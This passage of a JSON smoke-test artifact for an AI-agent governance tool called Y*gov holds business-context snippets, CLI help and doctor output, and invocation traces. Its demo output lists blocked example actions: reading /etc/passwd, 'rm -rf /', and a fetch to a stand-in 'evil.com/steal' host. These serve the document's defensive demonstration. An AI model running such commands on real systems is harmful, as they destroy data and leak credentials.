@@ -1,0 +1,2017 @@
+{
+  "artifact_id": "e46b_canonical_runtime_v1_1_smoke_result",
+  "audit_context": {
+    "CIEU_CZL_closure_expected": true,
+    "K9Audit_later_add_on": true
+  },
+  "ceo_brain_context": {
+    "active_task_time_source": "e46b_ceo_brain_adapter.load_ceo_brain_context",
+    "artifact_id": "e46b_ceo_brain_context",
+    "commercial_assets": [
+      {
+        "matched_terms": [
+          "revenue",
+          "pricing",
+          "enterprise",
+          "paid"
+        ],
+        "path": "finance/financial_health_20260415.md",
+        "score": 4,
+        "snippets": [
+          "| **Burn Multiple** | N/A | Division by zero (no revenue) |",
+          "| 2026-01-XX | Legal/IP | USPTO Provisional Patent P1 (CIEU framework) | $65.00 | expenditure_log.md line 10 | PAID \u2705 |",
+          "| 2026-03-26 | Legal/IP | USPTO Provisional Patent P3 | $65.00 | expenditure_log.md line 11 | PAID \u2705 |"
+        ]
+      },
+      {
+        "matched_terms": [
+          "revenue",
+          "pricing",
+          "enterprise",
+          "paid"
+        ],
+        "path": "finance/master_ledger_20260415.md",
+        "score": 4,
+        "snippets": [
+          "| 2026-01-XX | Legal/IP | USPTO Provisional Patent P1 (CIEU framework) | $65.00 | expenditure_log.md line 10 | PAID |",
+          "| 2026-03-26 | Legal/IP | USPTO Provisional Patent P3 | $65.00 | expenditure_log.md line 11 | PAID |",
+          "| 2026-03-26 | Legal/IP | USPTO Provisional Patent P4 | $65.00 | expenditure_log.md line 12 | PAID |"
+        ]
+      },
+      {
+        "matched_terms": [
+          "revenue",
+          "pricing",
+          "marketplace",
+          "enterprise"
+        ],
+        "path": "finance/pricing/discount_authority_matrix.md",
+        "score": 4,
+        "snippets": [
+          "| **21-35%** | CEO (Aiden) | Requires written justification + CFO sign-off on unit economics. | Enterprise land deal (>$20k/year ACV), reference customer commitment, co-marketing agreement. |",
+          "1. **Multi-tier downgrade after contract signing** (e.g., Enterprise \u2192 Team after first year).",
+          "2. **Perpetual license** (Y*gov is SaaS-only; no perpetual pricing without Board approval)."
+        ]
+      },
+      {
+        "matched_terms": [
+          "revenue",
+          "pricing",
+          "enterprise",
+          "paid"
+        ],
+        "path": "finance/pricing_model_v1.md",
+        "score": 4,
+        "snippets": [
+          "# Y*gov Pricing Model v1",
+          "## 1. Three-Tier Pricing Overview",
+          "| Dimension | Free (Developer) | Pro ($49/mo) | Enterprise ($499/mo+) |"
+        ]
+      },
+      {
+        "matched_terms": [
+          "revenue",
+          "pricing",
+          "enterprise",
+          "paid"
+        ],
+        "path": "knowledge/cfo/pricing_strategy.md",
+        "score": 4,
+        "snippets": [
+          "# Pricing Strategy Framework",
+          "- Designing initial pricing model",
+          "- Pivoting from unprofitable pricing"
+        ]
+      },
+      {
+        "matched_terms": [
+          "revenue",
+          "pricing",
+          "enterprise",
+          "paid"
+        ],
+        "path": "knowledge/cfo/unit_economics.md",
+        "score": 4,
+        "snippets": [
+          "- Pricing decisions",
+          "LTV = (ARPU \u00d7 Gross Margin %) / Revenue Churn Rate",
+          "Monthly Revenue Churn: 3%"
+        ]
+      },
+      {
+        "matched_terms": [
+          "revenue",
+          "pricing",
+          "enterprise",
+          "paid"
+        ],
+        "path": "sales/enterprise_prospects_0.48.0.md",
+        "score": 4,
+        "snippets": [
+          "# Enterprise Customer Prospecting Report \u2014 Y*gov 0.48.0",
+          "**Objective:** Identify first wave of enterprise customers for immediate outreach post-launch",
+          "Based on market analysis of enterprise AI agent adoption in 2026, I have identified **5 high-priority industry verticals** and **14 specific target companies** for Y*gov enterprise sales. The selection criteria prioritize:"
+        ]
+      },
+      {
+        "matched_terms": [
+          "plugin",
+          "marketplace",
+          "enterprise",
+          "paid"
+        ],
+        "path": "sales/skill_submissions.md",
+        "score": 4,
+        "snippets": [
+          "- **1 CONFIRMED** as a curated directory with automated crawling (claudemarketplaces.com)",
+          "**Recommended priority order:** skills.sh (largest ecosystem) > skillhub.club (developer portal) > claudemarketplaces.com (auto-crawled, needs install threshold)",
+          "## 1. claudemarketplaces.com"
+        ]
+      },
+      {
+        "matched_terms": [
+          "revenue",
+          "pricing",
+          "enterprise"
+        ],
+        "path": "content/cmo_k9audit_content_ideas.md",
+        "score": 3,
+        "snippets": [
+          "- Enterprise sales pitch deck\u7b2c\u4e00\u9875",
+          "- Enterprise pitch: ROI calculation\uff08engineer time saved\uff09",
+          "- Pricing page: \"No per-event fees, no data transmission costs\""
+        ]
+      },
+      {
+        "matched_terms": [
+          "revenue",
+          "pricing",
+          "enterprise"
+        ],
+        "path": "content/whitepaper/enterprise_compliance_audit_trails.md",
+        "score": 3,
+        "snippets": [
+          "**A Technical Whitepaper for Enterprise Compliance Officers**",
+          "Enterprises deploying AI agents face an emerging compliance gap: regulatory frameworks require demonstrable control and auditability over automated decision-making systems, but existing AI infrastructure lacks the governance mechanisms to p",
+          "**EU AI Act** (proposed, under finalization) classifies certain AI systems as \"high-risk\" and imposes requirements for human oversight, logging of operations, and technical documentation. Multi-agent systems operating with broad access to e"
+        ]
+      },
+      {
+        "matched_terms": [
+          "pricing",
+          "marketplace",
+          "enterprise"
+        ],
+        "path": "content/whitepaper/ystar_gov_runtime_governance_for_multi_agent_systems.md",
+        "score": 3,
+        "snippets": [
+          "Devin's 2024 public demos surfaced the enterprise version of this: a coding agent with git access, network egress, and shell \u2014 when it failed, the median debug session (per the Cognition team's own postmortems) was multi-hour because there ",
+          "| **v1.0 \u2014 GA** | 2026-Q2 | signed hook binaries, Windows native support, enterprise SSO bridge, first three paying customers |",
+          "| **v1.2 \u2014 policy marketplace** | 2026-Q4 | shareable IntentContract templates for regulated verticals (SOC2, HIPAA, EU AI Act Article 14 traceability) |"
+        ]
+      },
+      {
+        "matched_terms": [
+          "revenue",
+          "pricing",
+          "paid"
+        ],
+        "path": "finance/cost_analysis_001.md",
+        "score": 3,
+        "snippets": [
+          "### Token Pricing Reference",
+          "**Why expensive:** Opus pricing (5x Sonnet) + all-day context accumulation + every agent response loads into main thread.",
+          "| Main Opus Conversation (all-day) | $20-24 | 40-47% | Context accumulation + Opus pricing |"
+        ]
+      }
+    ],
+    "constitutional_sources": {
+      "DIRECTIVE_TRACKER": [
+        "| 1 | Enterprise customer research | CSO | \u2705 \u5b8c\u6210 | sales/enterprise_prospects_0.48.0.md (10.8KB) |",
+        "Accenture/Deloitte/PwC partnerships\uff08revenue model\u5f85pilot\u8c08\u5224\u786e\u5b9a\uff09"
+      ],
+      "M_TRIANGLE": [
+        "# M Triangle \u2014 Y* Bridge Labs \u7684\u6839\u672c\u76ee\u6807 (v1)",
+        "**\u4f4d\u7f6e**: `knowledge/ceo/wisdom/M_TRIANGLE.md`",
+        "Survivability Governability Value",
+        "### M-3 Value Production (\u4ef7\u503c\u4ea7\u51fa)",
+        "- S-3.5 **dogfood \u662f\u9500\u552e\u8bc1\u636e**: Y\\* Bridge Labs \u6bcf\u4e00\u4e2a CIEU event, \u6bcf\u4e00\u4e2a agent ship, \u6bcf\u4e00\u6b21 Board catch \u2014 \u90fd\u80fd\u53d8\u6210 \"AI agent company operating real\" \u7684 case study. dogfood \u4e0d\u662f\u5185\u90e8\u73a9, \u662f**\u9500\u552e pitch \u7684\u6838\u5fc3\u5f39\u836f**.",
+        "\u6211\u4eec\u901a\u8fc7 **Survivability + Governability + Value** \u4e09\u89d2\u4fdd\u6301\u540c\u65f6\u524d\u8fdb.",
+        "\u6bcf\u4e00\u6b21 GitHub star / \u5ba2\u6237\u4e0b\u8f7d / \u4ed8\u8d39\u90fd\u662f Value \u5728\u79ef\u7d2f."
+      ],
+      "OPERATIONS": [
+        "- CSO: User conversations, community engagement, pipeline updates",
+        "- CSO: Respond to user inquiries within 24 hours",
+        "| User contacts us | CSO leads, CTO supports technical, CMO prepares materials | 24 hours |",
+        "The central challenge was simple but unforgiving: Could a company operated by AI agents use its own governance product to prevent chaos? The answer arrived in the form of a Windows Git Bash error that blocked all governed sessions. The CTO ",
+        "But fixing code was the smaller revelation. The larger one came when the Board noticed the agents executing lower-priority tasks while a P0 blocker sat open. The governance framework's OmissionEngine could enforce deadlines but not dependen",
+        "Then came the SLA redesign. Human organizations measure response time in hours or days. But AI agents operate at millisecond-to-minute scales. A one-hour P0 window allows thousands of ungoverned decisions to accumulate. The Board rewrote th",
+        "By midday, the CEO had proposed a radical simplification: collapse five C-suite agents into two functional roles. The current structure had produced 50,000 words of documentation but zero users. Silicon Valley seed-stage companies don't hav",
+        "All of this happened under audit. Every command, every file read, every decision is now sealed in the CIEU database with SHA-256 hash chains. When the first enterprise customer asks \"Can you prove your agents didn't access restricted data?\""
+      ],
+      "WORK_METHODOLOGY": [
+        "Purpose: Enable every agent (CEO \u81ea\u5df1 + \u5168\u56e2\u961f) \u5728\u6bcf\u6b21 task / spec / ruling / impl / commit \u4e4b\u524d\u81ea\u52a8\u8dd1\u8fc7\u8fd9 14 \u6761 checklist; \u540c\u65f6\u8ba9 Samantha AMENDMENT-024 \u628a\u672c\u6587\u4ef6\u52a0\u5165 CLAUDE.md + AGENTS.md \u5fc5\u8bfb\u5f15\u7528; \u540c\u65f6\u8ba9 forget_guard \u52a0 rule work_methodology_violation \u68c0\u6d4b\u5173\u952e\u8fdd\u53cd.",
+        "**\u5f3a\u5236\u7ea7\u522b**: Constitutional \u2014 \u6240\u6709 agent boot \u5fc5\u8bfb, \u6240\u6709 task \u5fc5\u8fc7\u6b64 checklist",
+        "**\u65b9\u6cd5\u8bba = \u8ba9 M Triangle \u4e0d\u5728 plan \u548c action \u4e4b\u95f4\u65ad\u94fe\u7684 structural discipline. \u4e0d\u8d70\u5b8c\u8fd9 14 \u6761\u7684 task \u4e0d\u7b97 done, \u54ea\u6015 document \u5199\u4e86\u5f88\u591a.**",
+        "## 2. \u6bcf task \u524d checklist (15 \u79d2\u8fc7\u4e00\u904d)",
+        "\u4efb\u4f55 agent \u4efb\u4f55 task \u5f00\u5de5\u524d, \u8fc7\u8fd9\u4e2a 8 \u95ee checklist (\u4ece 14 \u6761\u539f\u5219\u63d0\u70bc):"
+      ]
+    },
+    "latest_runtime_artifacts": {
+      "operations/external_validation/e42_ceo_runtime_reuse_router_integration.json": {
+        "artifact_id": "e42_ceo_runtime_reuse_router_integration",
+        "daily_brief_mutated": false,
+        "directive_tracker_mutated": false,
+        "external_action_occurred": false,
+        "future_CEO_task_start_sequence": [
+          "task interpretation",
+          "task-capability match",
+          "reuse-first gate",
+          "compact task preflight packet",
+          "implementation plan only after reuse decision"
+        ],
+        "generated_at": "2026-05-05T00:00:01Z",
+        "not_second_KG": true,
+        "not_second_brain": true,
+        "runtime_added": "CEO task-relevant capability awareness and reuse router"
+      },
+      "operations/external_validation/e44a_full_history_runtime_capability_map.json": null,
+      "operations/external_validation/e45_ceo_brain_first_value_demo_update.json": {
+        "artifact_id": "e45_ceo_brain_first_value_demo_update",
+        "declared_to_actual_invocation": true,
+        "first_5_minute_blocker_fixed": true,
+        "first_value_demo_bundle_status": "created",
+        "local_demo_result": "ready_for_owner_review",
+        "next_decision_horizon": "owner decision on single real external user attempt vs additional local server/client polish",
+        "no_customer_validation": true,
+        "no_paid_signal": true,
+        "updated_bottleneck": "CEO can now invoke full-history runtime capabilities and run a local first-value demo, but must next obtain owner approval for one real external user attempt only after unresolved local/demo/docs blockers are cleared."
+      },
+      "operations/external_validation/e45_first_value_demo_bundle.json": {
+        "K9_CIEU_CZL_audit_context": "K9/CIEU/CZL attaches later as audit proof and watchdog context; no duplicate audit ledger created.",
+        "artifact_id": "e45_first_value_demo_bundle",
+        "customer_validation_claimed": false,
+        "generated_at": "2026-05-05T00:00:01Z",
+        "local_first_command_path": [
+          {
+            "classification": "passed",
+            "label": "gov_mcp_server_help",
+            "record": {
+              "command": [
+                "python3",
+                "-m",
+                "gov_mcp",
+                "--help"
+              ],
+              "cwd": "/Users/haotianliu/.openclaw/workspace/gov-mcp",
+              "returncode": 0,
+              "stderr": "",
+              "stdout": "usage: __main__.py [-h] [--session-config SESSION_CONFIG]\n                   [--agents-md AGENTS_MD] [--transport {stdio,sse}]\n                   [--host HOST] [--port PORT]\n                   [--exec-whitelist EXEC_WHITELIST]\n\nGOV MCP \u2014 Y*gov as a standard MCP server\n\noptional arguments:\n  -h, --help            show this help message and exit\n  --session-config SESSION_CONFIG\n                        Path to .ystar_session.json (Y*gov runtime config).\n                        Recommended since gov-mcp 0.2.0. Direct dict load,\n                        confidence \u22650.95.\n  --agents-md AGENTS_MD\n                        [DEPRECATED since 0.2.0] Path to AGENTS.md governance\n                        file. Falls back to regex translation, confidence\n                        \u22640.7. Use --session-config instead.\n  --transport {stdio,sse}\n                        MCP transport (default: stdio)\n  --host HOST           SSE host (only with --transport sse)\n  --port PORT           SSE port (required with --transport sse)\n  --exec-whitelist EXEC_WHITELIST\n                        Path to exec_whitelist.yaml (default: adjacent to\n                        server.py)\n",
+              "timed_out": false
+            }
+          },
+          {
+            "classification": "passed",
+            "label": "gov_mcp_install_help",
+            "record": {
+              "command": [
+                "python3",
+                "-m",
+                "gov_mcp",
+                "install",
+                "--help"
+              ],
+              "cwd": "/Users/haotianliu/.openclaw/workspace/gov-mcp",
+              "returncode": 0,
+              "stderr": "",
+              "stdout": "usage: gov-mcp install [-h] [--agents-md AGENTS_MD] [--port PORT]\n\noptional arguments:\n  -h, --help            show this help message and exit\n  --agents-md AGENTS_MD\n                        Path to AGENTS.md (auto-detected if omitted)\n  --port PORT           Server port (default: 7922, auto if busy)\n",
+              "timed_out": false
+            }
+          },
+          {
+            "classification": "passed",
+            "label": "gov_mcp_status",
+            "record": {
+              "command": [
+                "python3",
+                "-m",
+                "gov_mcp",
+                "status"
+              ],
+              "cwd": "/Users/haotianliu/.openclaw/workspace/gov-mcp",
+              "returncode": 0,
+              "stderr": "",
+              "stdout": "gov-mcp status\n==================================================\n  Running:    no\n  Run 'gov-mcp install' to start.\n",
+              "timed_out": false
+            }
+          },
+          {
+            "classification": "passed",
+            "label": "gov_mcp_command_help",
+            "record": {
+              "command": [
+                "gov-mcp",
+                "--help"
+              ],
+              "cwd": "/Users/haotianliu/.openclaw/workspace/gov-mcp",
+              "returncode": 0,
+              "stderr": "",
+              "stdout": "usage: gov-mcp [-h] {install,uninstall,status,restart} ...\n\nGOV MCP \u2014 Governed execution for AI agents\n\npositional arguments:\n  {install,uninstall,status,restart}\n    install             Detect, start, configure GOV MCP\n    uninstall           Stop server and remove configs\n    status              Show server status\n    restart             Restart server\n\noptions:\n  -h, --help            show this help message and exit\n",
+              "timed_out": false
+            }
+          },
+          {
+            "classification": "skipped_safety",
+            "label": "gov_mcp_install_start_server",
+            "reason": "Would bind a local port and may configure MCP clients; E45 records install --help/status and docs proof instead."
+          },
+          {
+            "classification": "passed",
+            "label": "ystar_help",
+            "record": {
+              "command": [
+                "python3",
+                "-m",
+                "ystar",
+                "--help"
+              ],
+              "cwd": "/Users/haotianliu/.openclaw/workspace/Y-star-gov",
+              "returncode": 0,
+              "stderr": "",
+              "stdout": "\nystar CLI\n\nCommands:\n  ystar setup          Generate .ystar_session.json (required for full governance)\n  ystar hook-install   Register PreToolUse hook\n  ystar init           Generate policy.py contract template\n  ystar audit          View causal audit report\n  ystar archive-cieu   Archive CIEU database to JSONL for permanent preservation\n  ystar simulate       Simulate A/B effect evaluation\n  ystar quality        Evaluate contract quality (coverage/FP rate)\n  ystar check          Run policy check on JSONL events file\n  ystar check-impact   Analyze session file for P0 risks and downstream impact\n  ystar report         Generate governance report\n  ystar baseline       Capture current governance state as baseline\n  ystar delta          Compare current state against baseline\n  ystar trend          Show 7-day CIEU event trend (total/deny/rate)\n  ystar demo           5-second wow moment -- governance in action\n  ystar doctor         Diagnose environment integrity (--layer1, --layer2)\n  ystar reset-breaker      Reset circuit breaker after manual intervention\n  ystar verify             Verify CIEU cryptographic integrity\n  ystar seal               Seal CIEU session with Merkle root\n  ystar policy-builder     Launch local HTML policy builder (port 7921)\n  ystar domain             Discover and use domain packs (list|describe|init)\n  ystar governance-coverage Show governance coverage report (agent/tool coverage)\n  ystar safemode           Board override mechanism (bypass governance with audit trail)\n  ystar version            Show version\n\nQuick start (3 steps to integrate with OpenClaw):\n  pip install ystar\n  ystar setup            <- Step 1: generate session config\n  ystar hook-install     <- Step 2: register hook\n  # Write AGENTS.md      <- Step 3: define your contract\n\n",
+              "timed_out": false
+            }
+          },
+          {
+            "classification": "passed",
+            "label": "ystar_demo",
+            "record": {
+              "command": [
+                "python3",
+                "-m",
+                "ystar",
+                "demo"
+              ],
+              "cwd": "/Users/haotianliu/.openclaw/workspace/Y-star-gov",
+              "returncode": 0,
+              "stderr": "",
+              "stdout": "\nY*gov Demo \u2014 governance in action\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[1] ALLOW  read ./projects/data.txt               0.07ms\n[2] DENY   read /etc/passwd                       0.04ms\n    \u2192 '/etc' is not allowed in file_path\n[3] ALLOW  run echo \"hello\"                       0.01ms\n[4] DENY   run rm -rf /                           0.01ms\n    \u2192 'rm -rf' is a forbidden command\n[5] DENY   fetch http://evil.com/steal            0.03ms\n    \u2192 domain not in allowed list\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n5 decisions in 0.15ms \u00b7 CIEU chain: intact \u2713\n\nNext: ystar setup && ystar hook-install && ystar doctor\n\n",
+              "timed_out": false
+            }
+          },
+          {
+            "classification": "failed",
+            "label": "ystar_doctor",
+            "record": {
+              "command": [
+                "python3",
+                "-m",
+                "ystar",
+                "doctor"
+              ],
+              "cwd": "/Users/haotianliu/.openclaw/workspace/Y-star-gov",
+              "returncode": 1,
+              "stderr": "",
+              "stdout": "\n  Y*gov Doctor \u2014 Layer1 (Zero-dependency checks)\n  ============================================================\n\n  [1] CIEU Database\n  [\u2713] CIEU Database \u2014 .ystar_cieu.db (52300 events)\n\n  [2] Omission Database\n  [\u2713] Omission Database \u2014 .ystar_cieu_omission.db (1310 violations)\n\n  [3] Contract File\n  [\u2713] Contract File \u2014 AGENTS.md (loaded, 58 lines)\n\n  [4] Interrupt Gate\n  [\u2717] Interrupt Gate \u2014 BLOCKING (9 overdue obligations)\n      \u2192 Complete pending obligations to clear gate\n  [ ] Circuit Breaker \u2014 engine not loaded (check at runtime)\n\n  [5] Unreachable Obligations\n  [\u2717] Unreachable Obligations \u2014 9 found\n      \u2192 Review obligations pending >7 days\n\n  [6] Engine Configuration\n  [\u2713] Engine Config \u2014 Valid (1 agents, 18 rules)\n\n  [7] Archive Freshness\n  [\u2717] Archive Freshness \u2014 31 days since last archive (>7 days)\n      \u2192 Run 'ystar archive-cieu' to preserve CIEU data\n\n  [8] External Config Reads\n  [\u2717] External Config Reads \u2014 1 unique paths detected\n      \u2192 Review external CLAUDE.md for context poisoning\n      \u2192 /Users/haotianliu/.openclaw/workspace/ystar-company/CLAUDE.md (2 reads)\n\n  [9] Runtime Constraints\n  [ ] Runtime deny \u2014 not present (ok)\n  [ ] Runtime relax \u2014 not present (ok)\n\n  [10] Governance Heartbeat\n  [\u2717] Governance Heartbeat \u2014 DEAD (orchestrator not initialized)\n      \u2192 Run agent commands to trigger hook initialization\n  [ ] Path B deny events: 0\n  [ ] Metalearning relax events: 0\n\n  Y*gov Doctor \u2014 Layer2 (Dependency checks)\n  ============================================================\n\n  [1] Git Repository\n  [\u2713] Git Repository \u2014 Available\n\n  [2] Python Dependencies\n  [\u2713] Python Dependencies \u2014 ystar installed (v0.48.0)\n\n  [3] Hook Installation\n  [\u2713] Hook Installation \u2014 Registered in settings.json\n\n  [4] Test Suite\n  [\u2713] Test Suite \u2014 85 test files found\n\n  ============================================================\n  8 passed, 5 failed\n  Run the suggested commands above to fix issues\n",
+              "timed_out": false
+            }
+          },
+          {
+            "classification": "passed",
+            "label": "ystar_command_demo",
+            "record": {
+              "command": [
+                "ystar",
+                "demo"
+              ],
+              "cwd": "/Users/haotianliu/.openclaw/workspace/Y-star-gov",
+              "returncode": 0,
+              "stderr": "",
+              "stdout": "\nY*gov Demo \u2014 governance in action\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n[1] ALLOW  read ./projects/data.txt               0.08ms\n[2] DENY   read /etc/passwd                       0.03ms\n    \u2192 '/etc' is not allowed in file_path\n[3] ALLOW  run echo \"hello\"                       0.01ms\n[4] DENY   run rm -rf /                           0.01ms\n    \u2192 'rm -rf' is a forbidden command\n[5] DENY   fetch http://evil.com/steal            0.03ms\n    \u2192 domain not in allowed list\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n5 decisions in 0.16ms \u00b7 CIEU chain: intact \u2713\n\nNext: ystar setup && ystar hook-install && ystar doctor\n\n",
+              "timed_out": false
+            }
+          }
+        ],
+        "name": "First Value Demo Bundle: Governed Agent Action Proof Packet",
+        "one_line_promise": "See deterministic governance block/allow agent actions and produce evidence in minutes.",
+        "paid_signal_claimed": false,
+        "plugin_commercial_wrapper_comparison": [
+          {
+            "reason": "CLI and status help are locally available; install server start is documented but skipped in E45 safety envelope.",
+            "role": "first local demo substrate",
+            "route": "pure gov-mcp CLI install",
+            "status": "active"
+          },
+          {
+            "reason": "Existing marketing/plugin assets support it, but E45 did not package or publish.",
+            "role": "first commercial wrapper candidate",
+            "route": "Claude Desktop plugin / MCPB path",
+            "status": "watchlist"
+          },
+          {
+            "reason": "Best explains user-visible value without claiming validation.",
+            "role": "first external user story wrapper",
+            "route": "commercial proof packet / agent action passport",
+            "status": "active_for_owner_review"
+          },
+          {
+            "reason": "Needs stronger local proof and owner-approved outreach before revenue claims.",
+            "role": "later revenue route",
+            "route": "bug bounty / workflow resale / enterprise route",
+            "status": "parked"
+          }
+        ],
+        "readiness_class": "ready_for_owner_review",
+        "target_user_persona": "AI engineer / agent framework power user / local MCP user",
+        "what_it_does_not_prove": [
+          "customer validation",
+          "paid signal",
+          "compliance certification",
+          "production readiness"
+        ],
+        "what_it_proves": [
+          "local governance path exists",
+          "install/demo path is understandable",
+          "proof object can be shown to owner/user"
+        ],
+        "what_user_should_see": [
+          "gov-mcp status proof",
+          "Y-star-gov demo proof",
+          "Y-star-gov doctor proof with honest environment blockers",
+          "governed allow/deny proof",
+          "governance envelope / CIEU proof where available"
+        ]
+      },
+      "operations/external_validation/e45_full_history_actual_invocation_trace.json": {
+        "actual_invocation_family_count": 8,
+        "actual_invocation_records": [
+          {
+            "decision_effect": "Article 11 compliance currently fails honestly; E45 must not treat the first-value route as fully disciplined until layers are completed.",
+            "family": "Article 11 / CEO OS",
+            "invocation_type": "subprocess",
+            "invoked": true,
+            "nonfatal": true,
+            "result_data": {
+              "command": [
+                "python3",
+                "scripts/article_11_tracker.py",
+                "check_compliance",
+                "--window_hours",
+                "2"
+              ],
+              "cwd": "/Users/haotianliu/.openclaw/workspace/ystar-bridge-labs",
+              "returncode": 1,
+              "stderr": "",
+              "stdout": "{\n  \"status\": \"ERROR\",\n  \"error\": \"unable to open database file\",\n  \"completed_layers\": [],\n  \"missing_layers\": [\n    0,\n    1,\n    2,\n    3,\n    4,\n    5,\n    6\n  ]\n}\n",
+              "timed_out": false
+            },
+            "result_status": "fail"
+          },
+          {
+            "decision_effect": "Working memory now contributes recent CIEU/subagent/commit state without mutating the repo.",
+            "family": "Working memory / LRS",
+            "invocation_type": "subprocess_then_function_capture_to_tmp",
+            "invoked": true,
+            "nonfatal": true,
+            "result_data": {
+              "capture": {
+                "active_subagents": 0,
+                "capture_attempted": true,
+                "capture_path": "/tmp/e45_working_memory_snapshot_e45_demo.json",
+                "recent_cieu_events": 0,
+                "recent_commits": 0
+              },
+              "load_latest": {
+                "command": [
+                  "python3",
+                  "scripts/working_memory_snapshot.py",
+                  "load-latest"
+                ],
+                "cwd": "/Users/haotianliu/.openclaw/workspace/ystar-bridge-labs",
+                "returncode": 1,
+                "stderr": "No snapshots found\n",
+                "stdout": "",
+                "timed_out": false
+              }
+            },
+            "result_status": "captured_to_tmp"
+          },
+          {
+            "decision_effect": "M Triangle and meta-development wisdom are recalled for first-user value production.",
+            "family": "Wisdom search / CEO wisdom corpus",
+            "invocation_type": "subprocess",
+            "invoked": true,
+            "nonfatal": false,
+            "result_data": {
+              "command": {
+                "command": [
+                  "python3",
+                  "scripts/wisdom_search.py",
+                  "--top",
+                  "3",
+                  "--json",
+                  "first real user value production M Triangle"
+                ],
+                "cwd": "/Users/haotianliu/.openclaw/workspace/ystar-bridge-labs",
+                "returncode": 0,
+                "stderr": "",
+                "stdout": "[\n  {\n    \"name\": \"Aiden Meta Development Method Kernel\",\n    \"path\": \"AIDEN_META_DEVELOPMENT_METHOD_KERNEL.md\",\n    \"type\": \"\",\n    \"score\": 0.1461\n  },\n  {\n    \"name\": \"Aiden 8 Module Cognitive Architecture\",\n    \"path\": \"meta/aiden_8_module_cognitive_architecture.md\",\n    \"type\": \"ceo wisdom (meta) / cognitive architecture\",\n    \"score\": 0.1333\n  },\n  {\n    \"name\": \"M Triangle\",\n    \"path\": \"M_TRIANGLE.md\",\n    \"type\": \"\",\n    \"score\": 0.1202\n  }\n]\n",
+                "timed_out": false
+              },
+              "top_results": [
+                {
+                  "name": "Aiden Meta Development Method Kernel",
+                  "path": "AIDEN_META_DEVELOPMENT_METHOD_KERNEL.md",
+                  "score": 0.1461,
+                  "type": ""
+                },
+                {
+                  "name": "Aiden 8 Module Cognitive Architecture",
+                  "path": "meta/aiden_8_module_cognitive_architecture.md",
+                  "score": 0.1333,
+                  "type": "ceo wisdom (meta) / cognitive architecture"
+                },
+                {
+                  "name": "M Triangle",
+                  "path": "M_TRIANGLE.md",
+                  "score": 0.1202,
+                  "type": ""
+                }
+              ]
+            },
+            "result_status": "pass"
+          },
+          {
+            "decision_effect": "First-user route must serve PMF/revenue/value production goals, not just prove a CLI exists.",
+            "family": "DIRECTIVE_TRACKER / OPERATIONS / M Triangle",
+            "invocation_type": "file_read_parse",
+            "invoked": true,
+            "nonfatal": false,
+            "result_data": {
+              "DIRECTIVE_TRACKER.md": [
+                "| 1 | Enterprise customer research | CSO | \u2705 \u5b8c\u6210 | sales/enterprise_prospects_0.48.0.md (10.8KB) |",
+                "Accenture/Deloitte/PwC partnerships\uff08revenue model\u5f85pilot\u8c08\u5224\u786e\u5b9a\uff09",
+                "- Zero external dependencies"
+              ],
+              "M_TRIANGLE.md": [
+                "# M Triangle \u2014 Y* Bridge Labs \u7684\u6839\u672c\u76ee\u6807 (v1)",
+                "**\u4f4d\u7f6e**: `knowledge/ceo/wisdom/M_TRIANGLE.md`",
+                "Survivability Governability Value",
+                "### M-3 Value Production (\u4ef7\u503c\u4ea7\u51fa)",
+                "- S-3.5 **dogfood \u662f\u9500\u552e\u8bc1\u636e**: Y\\* Bridge Labs \u6bcf\u4e00\u4e2a CIEU event, \u6bcf\u4e00\u4e2a agent ship, \u6bcf\u4e00\u6b21 Board catch \u2014 \u90fd\u80fd\u53d8\u6210 \"AI agent company operating real\" \u7684 case study. dogfood \u4e0d\u662f\u5185\u90e8\u73a9, \u662f**\u9500\u552e pitch \u7684\u6838\u5fc3\u5f39\u836f**.",
+                "\u6211\u4eec\u901a\u8fc7 **Survivability + Governability + Value** \u4e09\u89d2\u4fdd\u6301\u540c\u65f6\u524d\u8fdb.",
+                "\u6bcf\u4e00\u6b21 GitHub star / \u5ba2\u6237\u4e0b\u8f7d / \u4ed8\u8d39\u90fd\u662f Value \u5728\u79ef\u7d2f."
+              ],
+              "OPERATIONS.md": [
+                "The central challenge was simple but unforgiving: Could a company operated by AI agents use its own governance product to prevent chaos? The answer arrived in the form of a Windows Git Bash error that blocked all governed sessions. The CTO ",
+                "But fixing code was the smaller revelation. The larger one came when the Board noticed the agents executing lower-priority tasks while a P0 blocker sat open. The governance framework's OmissionEngine could enforce deadlines but not dependen",
+                "Then came the SLA redesign. Human organizations measure response time in hours or days. But AI agents operate at millisecond-to-minute scales. A one-hour P0 window allows thousands of ungoverned decisions to accumulate. The Board rewrote th",
+                "All of this happened under audit. Every command, every file read, every decision is now sealed in the CIEU database with SHA-256 hash chains. When the first enterprise customer asks \"Can you prove your agents didn't access restricted data?\"",
+                "The company runs at roughly $52 per day\u2014API costs and a Claude Max subscription, plus two USPTO provisional patents filed as insurance. Projected monthly burn: $1,550. Revenue: $0. Users: 0. But the product works on itself, which means it w",
+                "Tomorrow's priority is singular: get one external person to install Y*gov successfully. The CTO fixed the Windows bug. The README no longer tells users to install a package that doesn't exist. The doctor command returns real diagnostics. Th",
+                "- **External users:** 0 (blocking issue: installation verification incomplete)",
+                "- **Revenue:** $0",
+                "The Show HN launch waits on CTO confirmation that a clean installation succeeds on an external machine. Once verified, the company will publish its first external content and begin the search for its first real user. The governance framewor",
+                "The numbers tell the story: 679 PyPI downloads this month, but only 2 GitHub stars. 238 unique clones but zero external contributors. People are finding Y*gov, installing it, and leaving. The product works \u2014 406 tests prove that. The distri",
